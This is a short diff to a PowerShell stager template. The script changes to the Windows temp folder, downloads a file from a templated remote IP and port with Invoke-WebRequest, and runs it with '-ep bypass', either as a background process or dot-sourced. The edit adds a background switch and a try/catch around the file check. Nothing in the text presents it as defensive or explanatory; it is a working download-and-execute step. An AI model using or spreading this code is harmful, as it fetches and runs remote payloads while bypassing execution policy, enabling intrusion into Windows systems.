@@ -1,3 +1,10 @@
+$background = $true;
 cd C:\windows\temp;
-if (-not (Test-Path "${filename}")) { iwr -Uri "http://${http_ip}:${http_port}/${filename}" -OutFile "${filename}";};
-Start-Process -FilePath "powershell" -ArgumentList "-ep bypass ./${filename}";
+try { $fileExists = Test-Path "${filename}" } catch { $fileExists = $false };
+if (-not $fileExists) { iwr -Uri "http://${http_ip}:${http_port}/${filename}" -OutFile "${filename}";};
+if ($background) { 
+    Start-Process -FilePath "powershell" -ArgumentList "-ep bypass ./${filename}";
+}
+else { 
+    . .\${filename};
+}
